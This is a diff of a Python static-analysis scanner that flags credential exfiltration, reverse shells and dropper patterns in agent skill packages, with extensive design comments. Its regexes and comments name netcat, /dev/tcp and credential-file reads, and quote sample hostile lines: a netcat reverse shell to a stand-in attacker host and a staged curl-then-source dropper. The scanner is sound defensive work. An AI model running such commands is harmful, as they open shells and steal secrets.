+        # host-agent judge adjudicating this UNKNOWN has something concrete to check -
         # "verify the destination is trusted" with no destination was nothing to verify.
         # A variable/f-string URL can't be resolved statically; the message stays
         # generic rather than guessing (never fabricate a host).
         dest_host = _url_literal_host(node.args[0]) if node.args else None
         detail = (
             "an environment-variable or agent-config secret is placed in an "
-            "auth-shaped keyword (headers/auth/cert) of a network call — the normal "
+            "auth-shaped keyword (headers/auth/cert) of a network call \u2014 the normal "
             "way a skill authenticates to its own API, but never independently "
             "reviewed; verify the destination is trusted"
             + (f" (destination: {dest_host})" if dest_host else "")
@@ -13735,7 +13735,7 @@ def analyze_env_auth_kwarg_exfil(source: str, filename: str = "<skill>") -> list
 def _sink_key(effect_type, sink_name, guards):
     """Hashable identity for a reached-sink entry (B-192). `simulate()` already
     collapses `reached_sinks` downstream to the distinct (effect, sink) set plus the
-    distinct guard-description set per sink — so merging exact-duplicate entries
+    distinct guard-description set per sink - so merging exact-duplicate entries
     (same effect + sink + guard combination) here changes no downstream finding; it
     only stops the same duplicate from being re-copied at every nesting level."""
     return (
@@ -13782,7 +13782,7 @@ class State:
             raise ScanBudgetExceeded
 
     def merge_reached(self, other):
-        """Fold `other`'s reached_sinks into self, deduped (B-192) — used wherever
+        """Fold `other`'s reached_sinks into self, deduped (B-192) - used wherever
         simulate_if/simulate_loop used to `.extend()` two ever-growing lists."""
         for item in other.reached_sinks:
             key = _sink_key(item["effect"], item["sink"], item["guards"])
@@ -14012,7 +14012,7 @@ class EffectSimulator:
         if isinstance(node.func, ast.Attribute):
             is_base_tainted = self.check_expr_taint_sources(node.func.value, state, seed)
 
-        # 1. eval — detection data assembled from parts (not calls)
+        # 1. eval - detection data assembled from parts (not calls)
         eval_funcs = {"ex" + "ec", "ev" + "al", "compile"}
         eval_attrs = {"loads", "load"}
         is_eval = False
@@ -14396,7 +14396,7 @@ def _module_stem(relpath: str) -> str:
 
 def _package_tainted_exports(trees: dict) -> dict:
     """{module_stem: {exported name, ...}} for module-level names whose value derives from
-    a decode/decompress expression — an obfuscated blob that is dangerous to exec. A small
+    a decode/decompress expression - an obfuscated blob that is dangerous to exec. A small
     within-module alias fixpoint carries `y = x` when x is already tainted. Decode-only on
     purpose: exec of a cross-file *decoded* value is the split-payload pattern; broadening
     the source would add false positives on ordinary multi-file skills."""
@@ -14419,9 +14419,9 @@ def _package_tainted_exports(trees: dict) -> dict:
     return exports
 
 
-# ── Capability PRESENCE, as opposed to taint reachability (B-592) ─────────────
+# -- Capability PRESENCE, as opposed to taint reachability (B-592) -------------
 #
-# The effect simulator answers "does UNTRUSTED data reach this sink" — a risk question.
+# The effect simulator answers "does UNTRUSTED data reach this sink" - a risk question.
 # Two consumers were asking it a different question and reading the answer as if it were
 # a capability inventory: the vet dossier's Connections axis (which then stated "no
 # outbound network surface" for a skill whose only code posts to an external host) and
@@ -14430,7 +14430,7 @@ def _package_tainted_exports(trees: dict) -> dict:
 # a constant-URL fetch needs network permission exactly as much as a tainted one does.
 #
 # Deliberately the SAME call shapes the simulator registers effects for
-# (`EffectSimulator.simulate_call`'s four blocks), minus the taint gate — so the two
+# (`EffectSimulator.simulate_call`'s four blocks), minus the taint gate - so the two
 # views can never disagree about what a network/exec/read/write sink IS, only about
 # whether untrusted data reached it. `cred` is the one family the simulator never
 # registers at all, so it is defined here from the credential-path and credential-env
@@ -14439,7 +14439,7 @@ def _package_tainted_exports(trees: dict) -> dict:
 # Error profile, stated because it decides how the callers may use this: a false
 # POSITIVE costs a broader-than-necessary permission proposal and a vaguer axis
 # sentence; a false NEGATIVE leaves the caller exactly where it was before this
-# function existed. Neither direction can create a finding — no check consumes this.
+# function existed. Neither direction can create a finding - no check consumes this.
 
 #: Families this function can report. `eval` is folded into `exec` here, matching
 #: `report._MANIFEST_FAMILY_ALIASES`; `network`/`read`/`write` mirror the simulator's.
@@ -14502,7 +14502,7 @@ def _imported_sink_names(tree: ast.AST) -> tuple:
 
     Found by the adversarial pass on B-592: `from urllib.request import urlopen as u`
     then `u(url)` is an ORDINARY idiom, not evasion, and a bare-Name call carries no base
-    for `_is_net_sink` to gate on — so the whole family went unreported. Deliberately
+    for `_is_net_sink` to gate on - so the whole family went unreported. Deliberately
     NOT extended to `getattr(requests, "post")(...)` or
     `importlib.import_module("os").system(...)`: those are evasion shapes the engine's own
     rules do not resolve either, and a presence scan that out-detects the finding engine
@@ -14574,7 +14574,7 @@ def _capability_families_in_tree(tree: ast.AST, ctx: "_FsFoldCtx | None" = None)
 
 
 def capability_families(sources) -> set:
-    """Which capability families a skill's Python *touches at all* — presence, not taint.
+    """Which capability families a skill's Python *touches at all* - presence, not taint.
 
     `sources` is what `Context.installed_skill_py` holds: an iterable of
     ``(relpath, source)`` pairs. A bare source string, an iterable of plain strings, and
@@ -14583,7 +14583,7 @@ def capability_families(sources) -> set:
 
     Returns a subset of :data:`CAPABILITY_FAMILIES`. Unparseable source contributes
     nothing (it is reported as `AST_UNANALYZABLE` by `analyze_python`, and the callers
-    have their own "could not analyze" state) — never a fabricated absence.
+    have their own "could not analyze" state) - never a fabricated absence.
     """
     if sources is None:
         return set()
@@ -14614,7 +14614,7 @@ def capability_families(sources) -> set:
 def analyze_python_package(files) -> list[ASTFinding]:
     """Cross-file / import-graph taint (H1): a decode-derived module-level value defined in
     one skill file, imported and executed (exec/eval/os.system/subprocess) in another. The
-    per-file engine (analyze_python) misses this because each half is clean in isolation —
+    per-file engine (analyze_python) misses this because each half is clean in isolation -
     file A holds the obfuscated blob, file B imports and then runs it.
 
     `files` is an iterable of (relpath, source). Stdlib ast only; never raises, never
@@ -14691,7 +14691,7 @@ def analyze_python_package(files) -> list[ASTFinding]:
                         "crit",
                         ln,
                         f"{rel}:{ln} {sink} executes a decode-derived value imported from sibling "
-                        f"module {src_rel} — cross-file obfuscated payload split to evade per-file scanning",
+                        f"module {src_rel} \u2014 cross-file obfuscated payload split to evade per-file scanning",
                     )
                 )
     return out
@@ -14727,14 +14727,14 @@ _SH_CRED_FILE_RE = re.compile(
 # single characters immediately before the word: `{` (`${NC}`, bash's near-universal "No
 # Color" ANSI-reset variable) and `-` (a combined short-flag cluster on an unrelated
 # command, e.g. `jq -nc`). Round-1 also excluded a bare `$NC`, but independent C-135
-# review (round 2) found that unsound — `NC=nc; $NC target 4444 -e /bin/sh` is a real,
-# ordinary alias-bypass evasion the `$`-exclusion made invisible — so only `{` stayed
+# review (round 2) found that unsound - `NC=nc; $NC target 4444 -e /bin/sh` is a real,
+# ordinary alias-bypass evasion the `$`-exclusion made invisible - so only `{` stayed
 # excluded, leaving bare `$NC` deliberately matching (residual, see B-430 below).
 #
 # B-430: a lookbehind can only ever exclude a FIXED, finite set of preceding characters,
 # and four C-135 rounds on this line (each scoped to `${NC}`/`-nc` only) never noticed
 # that `.`, `/`, `(`, `[`, `;`, `#` are ALL equally valid `\b` left-boundaries a bare
-# `nc` can sit after. The highest-value miss: the `.nc` FILE EXTENSION — NetCDF
+# `nc` can sit after. The highest-value miss: the `.nc` FILE EXTENSION - NetCDF
 # (climate/ocean/atmospheric science's standard data format) and CNC G-code both use it
 # universally, and any path ending `.nc` sits right after a `.`, which `(?<![{-])` never
 # excluded. That hard-FAILed a skill reading `sst_2026-07-31.nc` next to an unrelated API
@@ -14745,14 +14745,14 @@ _SH_CRED_FILE_RE = re.compile(
 # compiled regex entirely for the ambiguous bare-`nc` case and reimplemented as
 # `_sh_bare_nc_invocation()` below: a whitespace/metacharacter TOKEN classifier requiring
 # `nc` to be its own isolated shell word (not a substring of `sst_2026-07-31.nc`,
-# `/nc/index.php`, `${nodes[nc]}`, or `nc=$((nc+1))` — none of those are ever a
+# `/nc/index.php`, `${nodes[nc]}`, or `nc=$((nc+1))` - none of those are ever a
 # standalone token) AND in command position AND followed by an argument-shaped token.
-# `ncat`/`netcat` stay here unchanged (no reported collision — nothing ends a path in
+# `ncat`/`netcat` stay here unchanged (no reported collision - nothing ends a path in
 # `.ncat`), as does `/dev/tcp/` (an unambiguous literal, no word-boundary ambiguity at
 # all). See `_sh_bare_nc_invocation`'s docstring for the full mechanism, the `$NC`
 # residual carry-over, and what this round's C-135 tried and retracted.
 _SH_OUTBOUND_RE = re.compile(r"\b(?:curl|wget|ncat|netcat)\b|/dev/tcp/", re.I)
-# curl|wget URL piped into a NON-shell interpreter (download -> exec) — extends the
+# curl|wget URL piped into a NON-shell interpreter (download -> exec) - extends the
 # sh/bash-only _PIPE_SHELL_RE (the checks engine) to python/node/perl/ruby/php/deno.
 _SH_PIPE_INTERP_RE = re.compile(
     r"(?:curl|wget)\b[^\n|]{0,256}?https?://[^\n|]{0,256}\|\s*(?:sudo\s+)?"
@@ -14763,12 +14763,12 @@ _SH_PIPE_INTERP_RE = re.compile(
 # variable whose value derives from reading a credential file.
 # B-102: the quantifiers are length-bounded so the pattern stays O(n) on adversarial
 # input (e.g. a 40KB identifier run has no '=' and previously backtracked at every start
-# → quadratic). A real credential-read assignment line is short, so the bounds (128-char
+# -> quadratic). A real credential-read assignment line is short, so the bounds (128-char
 # var, 256-char gaps) never clip a genuine match.
 #
 # B-894: this vocabulary is factored into its own fragment, `_SH_CRED_READ_PATH_SRC`,
 # shared with the loop-variable taint reader below (`_SH_LOOP_READ_PATH_RE` is built
-# from the same fragment) — the `_CRED_NAME_WORDS` precedent. A path added here is a
+# from the same fragment) - the `_CRED_NAME_WORDS` precedent. A path added here is a
 # path the loop-hop reader also recognizes, and vice versa, so the two forms cannot
 # drift apart the way the discarded fix/b-894 rounds let the loop form outrun this one
 # (R-3 in the design note above `analyze_shell`). The `.claude|.codex|.gemini/mcp.json`
@@ -14796,22 +14796,22 @@ _SH_CRED_READ_PATH_RE = re.compile(_SH_CRED_READ_PATH_SRC, re.I)
 # B-934: the reader alternatives (cat|less|head|tail|<) previously matched as a bare
 # substring anywhere between the assignment's `=` and the credential path, so
 # `filename=$(basename ~/.openclaw/a.json)` false-fired ("cat" inside "appli-CAT-ion")
-# and `N=$(wc -c < ~/.netrc)` false-fired (a byte COUNT, not the file's content — the
+# and `N=$(wc -c < ~/.netrc)` false-fired (a byte COUNT, not the file's content - the
 # `<` was matched as a bare mid-command redirection, not the `$(<file)` read form).
 # Fixed by mirroring `_SH_LOOP_SUBST_READ_RE`'s (B-894) command-position anchoring: the
 # reader must sit immediately after a `$(`/backtick command-substitution open (optional
 # `sudo`, optional `[\w./-]*/` path prefix, `\b`-bounded), or be the `<` of the
-# `$(<file)` redirection-read form specifically — never a bare substring/mid-command
+# `$(<file)` redirection-read form specifically - never a bare substring/mid-command
 # redirection. Keeping this idiom identical to the loop-hop reader is deliberate (the
 # same `_CRED_NAME_WORDS`-style precedent already documented above
 # `_SH_CRED_READ_PATH_SRC`): the two reader vocabularies must not drift apart.
 #
-# Inherited limitation (documented, not fixed — same trade-off B-894 already made and
+# Inherited limitation (documented, not fixed - same trade-off B-894 already made and
 # had reviewed for `_SH_LOOP_SUBST_READ_RE`, kept intentionally identical here rather
 # than reintroducing the old bare-substring FP surface): because the reader must sit
-# immediately at command position after `$(`/backtick, a reader reached indirectly —
+# immediately at command position after `$(`/backtick, a reader reached indirectly -
 # `$(eval cat ~/.netrc)`, `$(bash -c "cat ~/.netrc")`, or a chained command before the
-# reader like `$(set -e; cat ~/.netrc)` — is NOT detected. `tests/test_shell_scan.py`
+# reader like `$(set -e; cat ~/.netrc)` - is NOT detected. `tests/test_shell_scan.py`
 # pins this as an accepted gap for the direct (non-loop) path; B-894's own
 # `test_r2_b_eval_is_a_documented_fn` / `test_adv_bash_c_child_shell_loop_passes` pin
 # the equivalent loop-hop shapes.
@@ -15493,7 +15493,7 @@ def _sh_line_incluster_exemption(
 
 
 # decode-then-exec: an encoded blob is decoded (base64/xxd/openssl) and piped straight
-# into a shell/interpreter — the classic obfuscated-RCE dropper. Encode (no -d) and
+# into a shell/interpreter - the classic obfuscated-RCE dropper. Encode (no -d) and
 # decode-to-file (no `| interp`) stay silent.
 _SH_DECODE_EXEC_RE = re.compile(
     r"\b(?:base64\s+-[a-z]*d[a-z]*|base64\s+--decode|xxd\s+-r|"
@@ -15501,23 +15501,23 @@ _SH_DECODE_EXEC_RE = re.compile(
     r"[^\n]*\|\s*(?:sudo\s+)?(?:sh|bash|zsh|ksh|dash|python3?|node|perl|ruby|php|deno)\b",
     re.I,
 )
-# eval/source of a remote download — `eval "$(curl … http…)"` / `source <(wget … http…)`.
+# eval/source of a remote download - `eval "$(curl ... http...)"` / `source <(wget ... http...)`.
 # The tight, defensible slice of "$()-command-injection": only a remote fetch feeding
-# eval/source fires (a bare $(…) or a local eval stays silent).
+# eval/source fires (a bare $(...) or a local eval stays silent).
 _SH_EVAL_REMOTE_RE = re.compile(
     r"\b(?:eval|source)\b[^\n]*(?:\$\(|<\()\s*(?:sudo\s+)?(?:curl|wget)\b[^\n)]*https?://",
     re.I,
 )
-# raw-socket outbound (nc//dev/tcp) — deliberately EXCLUDES curl/wget, which legitimately
+# raw-socket outbound (nc//dev/tcp) - deliberately EXCLUDES curl/wget, which legitimately
 # carry an auth header to an API. Sending a secret over a raw socket is not legitimate.
-# B-341/B-430: same bare-`nc` history as _SH_OUTBOUND_RE above — see its comment. The
+# B-341/B-430: same bare-`nc` history as _SH_OUTBOUND_RE above - see its comment. The
 # bare-`nc` alternative lives in `_sh_bare_nc_invocation()` now, not in this regex.
 _SH_RAW_SOCKET_RE = re.compile(r"\b(?:ncat|netcat)\b|/dev/tcp/", re.I)
-# a credential-shaped env-var NAME (contains TOKEN/SECRET/API_KEY/…). Gating env->outbound
+# a credential-shaped env-var NAME (contains TOKEN/SECRET/API_KEY/...). Gating env->outbound
 # on the name (not any $VAR) is what keeps this zero-FP against authed-API scripts.
 # The credential-shaped NAME vocabulary, shared by the shell rule below and by
 # `capability_families`' Python-side env read (B-592) so the two cannot drift into
-# disagreeing about what "looks like a secret" — the divergent-table failure B-483
+# disagreeing about what "looks like a secret" - the divergent-table failure B-483
 # documented for the ascii folder. `tests/test_b592_capability_presence.py` pins the
 # shell pattern's rendered source, so rebuilding it from this fragment cannot silently
 # change the rule it has always implemented.
@@ -15530,7 +15530,7 @@ _SH_CRED_ENV_RE = re.compile(
     r"[A-Za-z0-9_]*\}?",
     re.I,
 )
-#: The same vocabulary against a bare identifier — `os.environ["API_TOKEN"]`, which
+#: The same vocabulary against a bare identifier - `os.environ["API_TOKEN"]`, which
 #: carries no `$`. Used only for capability PRESENCE, never for a finding.
 _CRED_ENV_NAME_RE = re.compile(
     r"[A-Za-z0-9_]*(?:" + _CRED_NAME_WORDS + r")[A-Za-z0-9_]*", re.I
@@ -15539,25 +15539,25 @@ _CRED_ENV_NAME_RE = re.compile(
 # B-430: metacharacters that can glue directly onto a word with no surrounding
 # whitespace (`foo;nc`, `(nc`, `` `nc ``) get spaced out before whitespace-splitting, so
 # an `nc` glued to a separator is still recognized as its own token. `)` is deliberately
-# EXCLUDED from this list — see `_sh_bare_nc_invocation`'s case-label note below.
+# EXCLUDED from this list - see `_sh_bare_nc_invocation`'s case-label note below.
 _SH_NC_METACHAR_RE = re.compile(r"([;&|(`])")
 # A trailing token after `nc` that looks like a bare port number, tolerating whatever
 # punctuation (`)`, `;`, a trailing quote/backtick) sits glued on the end with no space.
 _SH_NC_PORT_RE = re.compile(r"^\d{1,5}[)\];,`\"']*$")
 # A single combined `host:port` argument, same trailing-punctuation tolerance.
 _SH_NC_HOSTPORT_RE = re.compile(r"^[\w.-]+:\d{1,5}[)\];,`\"']*$")
-# Tokens that unambiguously start a new command segment — `nc` immediately after one of
+# Tokens that unambiguously start a new command segment - `nc` immediately after one of
 # these is always in command position. `-exec` (find's own syntax: the word right after
 # it is always the command name) rides along here rather than in the no-op prefix set
-# below, since — unlike `sudo`/`env`/etc. — arbitrary `find` flags can sit between `find`
+# below, since - unlike `sudo`/`env`/etc. - arbitrary `find` flags can sit between `find`
 # and `-exec`, so `-exec` itself (not whatever precedes it) is the anchor.
 _SH_NC_SEGMENT_START = frozenset(
     {";", "|", "&", "(", "`", "then", "do", "else", "elif", "!", "-exec"}
 )
 # No-op wrapper words: skipping backward over any of these (plus flag-shaped tokens and
 # `VAR=val` prefix assignments, handled in `_sh_nc_command_position`) still counts as
-# command position — covers `sudo nc …`, `command nc …`, `env FOO=bar nc …`,
-# `eval "nc …"`, `xargs -n1 nc …`.
+# command position - covers `sudo nc ...`, `command nc ...`, `env FOO=bar nc ...`,
+# `eval "nc ..."`, `xargs -n1 nc ...`.
 _SH_NC_NOOP_PREFIX = frozenset(
     {
         "sudo",
@@ -15580,10 +15580,10 @@ _SH_NC_VAR_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=\S*$")
 def _sh_nc_word(tok: str) -> str:
     """Normalize one whitespace/metachar-delimited shell word for bare-`nc` identity
     comparison. Strips surrounding quote characters, a single leading backslash (the
-    `\\nc` alias/function-shadow bypass — backslash-escaping a command name to skip a
+    `\\nc` alias/function-shadow bypass - backslash-escaping a command name to skip a
     shell alias or function of the same name is a real, documented evasion, not a corner
     case), and a single leading bare `$` (the deliberately-preserved `$NC` alias-
-    invocation residual carried over from B-341 round 2 — `NC=nc; $NC host 4444` is a
+    invocation residual carried over from B-341 round 2 - `NC=nc; $NC host 4444` is a
     real evasion with no sound way to distinguish it from a bare color-reset variable at
     the token level, so it is intentionally still treated as `nc`, same as before).
     Braced `${NC}` is NOT unwrapped by the `$`-strip (the leading `{` blocks it), so it
@@ -15600,10 +15600,10 @@ def _sh_nc_command_position(words: list, i: int) -> bool:
     """True if `words[i]` sits where a shell COMMAND NAME can appear: at the start of the
     line/segment, or reached by skipping backward only over no-op wrapper words
     (`_SH_NC_NOOP_PREFIX`), `VAR=val` prefix assignments, and flag-shaped tokens (`-n1`,
-    `-u`, …) — covering `sudo nc …`, `env FOO=bar nc …`, `xargs -n1 nc …`, `eval "nc …"`,
-    and (via `_SH_NC_SEGMENT_START`) `find … -exec nc …`. Any other word in between (a
-    filename, `for`, `case`, a trailing-comment `#`, …) blocks it — this is what excludes
-    the `case … in` / `nc)` pattern label, the `for nc in …` loop variable, and an `nc`
+    `-u`, ...) - covering `sudo nc ...`, `env FOO=bar nc ...`, `xargs -n1 nc ...`, `eval "nc ..."`,
+    and (via `_SH_NC_SEGMENT_START`) `find ... -exec nc ...`. Any other word in between (a
+    filename, `for`, `case`, a trailing-comment `#`, ...) blocks it - this is what excludes
+    the `case ... in` / `nc)` pattern label, the `for nc in ...` loop variable, and an `nc`
     mentioned inside a trailing inline comment (masking only blanks WHOLE-LINE comments;
     see `_sh_mask_comments`)."""
     j = i - 1
@@ -15627,9 +15627,9 @@ def _sh_nc_command_position(words: list, i: int) -> bool:
 
 def _sh_nc_arg_follows(words: list, i: int) -> bool:
     """True if the word(s) after `words[i]` look like real `nc` arguments: a flag (`-e`,
-    `-lvp`, …) anywhere in the next few words (covers a port-before-flag ordering, e.g.
+    `-lvp`, ...) anywhere in the next few words (covers a port-before-flag ordering, e.g.
     an `xargs`-appended arg landing before an explicit `-e`), a combined `host:port`, or
-    a bare host word followed by a numeric port word (`nc attacker.example 4444`) —
+    a bare host word followed by a numeric port word (`nc attacker.example 4444`) -
     excluding a case-label's `)`, an arithmetic reference, or ordinary prose (a trailing
     comment's next English word)."""
     window = [w.strip("'\"") for w in words[i + 1 : i + 4]]
@@ -15655,17 +15655,17 @@ def _sh_bare_nc_invocation(line: str) -> bool:
     a single-character lookbehind can exclude at most one preceding character, but `.`,
     `/`, `(`, `[`, `;`, `#` are ALL valid `\\b` left-boundaries for a bare `nc` that a
     lookbehind-only design can never enumerate completely (the highest-value miss is the
-    `.nc` file extension — NetCDF and CNC G-code both use it, and any path ending `.nc`
+    `.nc` file extension - NetCDF and CNC G-code both use it, and any path ending `.nc`
     sits right after a `.`). Rather than add yet another excluded character, bare-`nc`
     detection moves to an isolated shell WORD + command-position + argument-shape check:
 
       1. `nc` must be its OWN whitespace/metachar-delimited token, not a substring of a
          longer one. This alone kills the whole `.nc`/`/nc/`/`${nodes[nc]}`/
-         `nc=$((nc+1))` collision class — none of those is ever a standalone token.
-      2. It must sit in COMMAND POSITION (`_sh_nc_command_position`) — excludes the
-         `case … in` / `nc)` pattern label and the `for nc in …` loop variable, both real
+         `nc=$((nc+1))` collision class - none of those is ever a standalone token.
+      2. It must sit in COMMAND POSITION (`_sh_nc_command_position`) - excludes the
+         `case ... in` / `nc)` pattern label and the `for nc in ...` loop variable, both real
          standalone tokens that are never a command name.
-      3. It must be followed by an argument-shaped token (`_sh_nc_arg_follows`) — a
+      3. It must be followed by an argument-shaped token (`_sh_nc_arg_follows`) - a
          second, independent signal that excludes an `nc` mentioned in a trailing inline
          comment (`curl ... # nc is not used here` still reaches this scan, since
          `_sh_mask_comments` only blanks WHOLE-LINE comments); ordinary English prose
@@ -15682,19 +15682,19 @@ def _sh_bare_nc_invocation(line: str) -> bool:
     function; all three were retracted per CLAUDE.md §2.5, documented here rather than
     attempted a 6th narrow-regex-style iteration:
 
-      - `sudo -u root nc …` — an option VALUE (`root`), not a flag, sits between the
+      - `sudo -u root nc ...` - an option VALUE (`root`), not a flag, sits between the
         wrapper and `nc`. Distinguishing an option's VALUE from a bare positional
         argument needs per-command flag-arity knowledge (`-u` takes a value on `sudo`,
         `-name`'s value on `find` sits the same way) this generic token scanner cannot
         have without becoming unsound for some OTHER wrapper's flags.
-      - general variable-reconstruction (`cmd="n"; cmd+="c"; $cmd …`) — needs real
+      - general variable-reconstruction (`cmd="n"; cmd+="c"; $cmd ...`) - needs real
         data-flow tracking this per-line, non-parsing scanner has never had.
       - `xargs nc 4444` with only ONE static numeric argument and no explicit `-I{}`
-        placeholder — relies on xargs's default behavior of APPENDING the piped-in value
+        placeholder - relies on xargs's default behavior of APPENDING the piped-in value
         as the LAST argument, which would actually run `nc 4444 <host>`. Per `nc(1)`,
-        the positional syntax is `nc [flags] [destination] [port]` — destination first —
+        the positional syntax is `nc [flags] [destination] [port]` - destination first -
         so that argument ORDER is not a functionally valid exfiltration payload in the
-        first place; `xargs -I{} nc {} 4444 …` (explicit placeholder, syntactically
+        first place; `xargs -I{} nc {} 4444 ...` (explicit placeholder, syntactically
         correct) is still caught (see tests).
 
     None of these are a NEW gap this change introduces: the OLD `\\bnc\\b`
@@ -15702,7 +15702,7 @@ def _sh_bare_nc_invocation(line: str) -> bool:
     strictly it "caught" them, but the first two were never reachable exploits without a
     real shell/data-flow engine this scanner doesn't have, and the third isn't a working
     payload as written. All three remain accepted, documented blind spots of a
-    stdlib-only, non-parsing, per-line shell scanner — not silently dropped."""
+    stdlib-only, non-parsing, per-line shell scanner - not silently dropped."""
     if "nc" not in line.lower():
         return False
     words = _SH_NC_METACHAR_RE.sub(r" \1 ", line).split()
@@ -15718,13 +15718,13 @@ def _sh_bare_nc_invocation(line: str) -> bool:
 
 # B-341: the original false-condemnation repro attributed to THIS check (SkillTrustBench
 # unifi-api.sh, case_01666/case_04964) was `jq -nc --arg password "$PASS"
-# '{...,password:$password}'` matching SHELL_ENV_EXFIL — but the actual trigger turned
+# '{...,password:$password}'` matching SHELL_ENV_EXFIL - but the actual trigger turned
 # out to be `_SH_RAW_SOCKET_RE` matching "nc" inside jq's own `-nc` (`-n -c`) combined
 # short-flag cluster, NOT a real credential-var/raw-socket pairing. Once the bare-`nc`
 # matching (now `_sh_bare_nc_invocation`, née the `_SH_OUTBOUND_RE`/`_SH_RAW_SOCKET_RE`
-# lookbehind — see B-430 above) stopped matching a bare `nc` immediately preceded by `-`
+# lookbehind - see B-430 above) stopped matching a bare `nc` immediately preceded by `-`
 # (a flag cluster on some OTHER command) or `{` (a `${NC}` variable reference), that
-# match no longer fires on `-nc` at all — this SHELL_ENV_EXFIL check is never even
+# match no longer fires on `-nc` at all - this SHELL_ENV_EXFIL check is never even
 # reached for it, so both corpus cases are already resolved. VERIFIED empirically against
 # the real fixture content, not assumed.
 #
@@ -15732,33 +15732,33 @@ def _sh_bare_nc_invocation(line: str) -> bool:
 # awareness directly to this check specifically, on the (incorrect) assumption that the
 # credential-var-in-jq-template shape itself needed excluding here. Each attempt (a
 # same-line parity count, a blob-wide bash quote-state machine, a narrow jq-`'{...}'`
-# regex, a proper bash lexer) was retracted after breaking some other real case — full
+# regex, a proper bash lexer) was retracted after breaking some other real case - full
 # history preserved in `checks._vet._redirect_targets_file`'s docstring, whose sibling
 # fix (the comment-line redirect exclusion) DOES have a genuine remaining residual.
 # Nothing from those four rounds landed here: the bare-`nc` narrowing above was
 # sufficient on its own, and this check is otherwise pre-B-341 behavior, unchanged.
 
 
-# B-284: SHELL_EVAL_REMOTE above only covers the INLINE form — `eval "$(curl … http…)"`,
-# `source <(wget … http…)`. The STAGED form writes the payload to a path first and runs
+# B-284: SHELL_EVAL_REMOTE above only covers the INLINE form - `eval "$(curl ... http...)"`,
+# `source <(wget ... http...)`. The STAGED form writes the payload to a path first and runs
 # that path on a later line:
 #
 #     CONFIG_URL="https://185.45.12.99/config/skill.json"
 #     curl -fsSL "$CONFIG_URL" -o /tmp/_skill_config.sh
 #     source /tmp/_skill_config.sh
 #
-# Semantically identical to `source <(curl …)`, invisible to every inline pattern, and
+# Semantically identical to `source <(curl ...)`, invisible to every inline pattern, and
 # the real shape of three SkillTrustBench dropper cases (case_00110 / case_02509 /
 # case_03702). Before B-284 the only reason those FAILed B13 was F-021 matching an
-# unrelated word elsewhere in the package, so tightening F-021 exposed the gap — closed
+# unrelated word elsewhere in the package, so tightening F-021 exposed the gap - closed
 # here, where the signal actually is.
 #
 # Two independent signals must line up, which is what keeps it precise: a download whose
 # OUTPUT PATH is a literal, and a later execution naming that SAME literal path. A script
 # that merely downloads a file, or merely sources a local file, never fires.
 # B-284 round 2 (independent C-135 finding): `-o\s+`/`-O\s+` only matches an output flag
-# written on its own, so the extremely common COMBINED short-flag cluster — `wget -qO
-# /tmp/x.sh <url>`, `curl -fsSLo /tmp/x.sh <url>` — evaded the rule entirely, including
+# written on its own, so the extremely common COMBINED short-flag cluster - `wget -qO
+# /tmp/x.sh <url>`, `curl -fsSLo /tmp/x.sh <url>` - evaded the rule entirely, including
 # the path-before-URL ordering. `-(?!-)[A-Za-z]{0,8}[oO]` accepts a cluster of no-argument
 # short flags ending in o/O; the `(?!-)` keeps `--output` on its own explicit alternative
 # and stops a long-option name from being mined for a stray `o`.
@@ -15771,11 +15771,11 @@ _SH_DOWNLOAD_TO_PATH_RE = re.compile(
 # B-284 round 2: the download line's own literal URL, used to apply the same C-224/B-118
 # first-party installer allowlist DROPPER_DOWNLOAD_TO_TMP already applies to the identical
 # shape. Without it, `curl -o /tmp/rustup.sh https://sh.rustup.rs` + `sh /tmp/rustup.sh`
-# was crit while the piped form of the SAME url passes — an inconsistency, and a real
+# was crit while the piped form of the SAME url passes - an inconsistency, and a real
 # false positive on any skill that documents a rustup/uv/nvm install in two steps.
 _SH_LINE_URL_RE = re.compile(r"https?://[^\s\"'<>|)]{4,512}")
 # The URL may sit on the same line or come from a variable assigned earlier, so the
-# download line itself is not required to carry an http literal — see _sh_staged_exec.
+# download line itself is not required to carry an http literal - see _sh_staged_exec.
 _SH_RUN_PATH_RE = re.compile(
     r"(?:^|[\n;&|]|\b(?:then|do|else)\s+)\s*(?:sudo\s+)?"
     r"(?:source|\.|bash|sh|zsh|python3?|node|perl|ruby)\s+"
@@ -15792,7 +15792,7 @@ def _sh_norm_path(raw: str) -> str:
 
 def _sh_staged_exec(masked: str) -> list[tuple[int, str]]:
     """B-284: (lineno, path) for every download-to-a-literal-path that is later executed
-    by that same path. Requires an http(s) URL somewhere in the script — a purely local
+    by that same path. Requires an http(s) URL somewhere in the script - a purely local
     copy-then-run is ordinary tooling, not a remote payload."""
     if not _SH_HTTP_RE.search(masked):
         return []
@@ -15839,13 +15839,13 @@ def _sh_staged_exec(masked: str) -> list[tuple[int, str]]:
 # INVARIANT (pinned by tests/test_b894_shell_loop_cred_taint.py): a
 # `for V in <literal words>; do BODY; done` loop is sugar for BODY repeated with V
 # replaced by each word. This engine adds ONLY what the UNCHANGED literal rules above
-# (`_SH_CRED_FILE_RE` / `_SH_CRED_ASSIGN_RE`, and — since B-988 —
+# (`_SH_CRED_FILE_RE` / `_SH_CRED_ASSIGN_RE`, and - since B-988 -
 # `_sh_line_incluster_exemption`, the SAME function the literal path itself calls, not
 # a loop-only copy) would convict on that unrolled text, and is NEVER broader than
-# them — every role below uses exactly the literal rule's own vocabulary and exemption
+# them - every role below uses exactly the literal rule's own vocabulary and exemption
 # for that role. (Before B-988 this invariant was VIOLATED for the DIRECT role: it
-# called the older, enumeration-based `_sh_cred_match_is_incluster_auth_only` — which
-# has no concept of HOP/proxy flags at all — instead of the literal path's own B-986
+# called the older, enumeration-based `_sh_cred_match_is_incluster_auth_only` - which
+# has no concept of HOP/proxy flags at all - instead of the literal path's own B-986
 # argv-parsed `_sh_line_incluster_exemption`, so a loop body could win an exemption the
 # literal rule would have refused; see the B-988 note above `_sh_line_incluster_exemption`
 # for the exact repro.) There is
@@ -15853,15 +15853,15 @@ def _sh_staged_exec(masked: str) -> list[tuple[int, str]]:
 # states wins" question. V is covered structurally, by loop-body region, and nothing
 # else. A reviewer repro is therefore either an invariant violation (a bug here, fix
 # it) or it FAILs identically in its literal twin (the literal rule's own pre-existing
-# behavior, not this one's — filed separately, e.g. B-934/935/936).
+# behavior, not this one's - filed separately, e.g. B-934/935/936).
 #
 # Deliberately out of scope (FN; the literal analogue is also PASS or out of scope, so
 # nothing regresses): a reference to V after `done` (including the "break" idiom), a
 # second hop (`local X=$(cat "$V"); D="$D$X"`), `printf -v`, `eval`, base64, arrays,
-# `while read`, `select`, tmpfiles, `$(for …)` capture, and a helper function defined
